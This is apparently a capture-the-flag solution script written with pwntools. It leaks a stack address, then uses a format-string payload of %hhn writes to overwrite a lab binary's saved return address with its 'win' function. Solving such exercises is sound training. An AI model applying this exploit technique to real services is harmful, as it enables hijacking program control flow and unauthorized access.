from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25198

elf = ELF("08_return")
win_address = elf.symbols["win"]  # 0x080491f6

# leak simples
s = remote(SERVER, PORT)
s.sendline(b"%1$p")
leak = int(s.recvline().strip(), 16)
s.close()

# saved eip = leak + offset
ret_address = leak + 0x90

print("win:", hex(win_address))
print("ret:", hex(ret_address))

s = remote(SERVER, PORT)

payload = p32(ret_address)
payload += p32(ret_address + 1)
payload += p32(ret_address + 2)
payload += p32(ret_address + 3)

# win = f6 91 04 08 (little endian)
payload += b"%230c%7$hhn"  # f6
payload += b"%155c%8$hhn"  # 91
payload += b"%115c%9$hhn"  # 04
payload += b"%4c%10$hhn"  # 08

s.sendline(payload)
s.interactive()
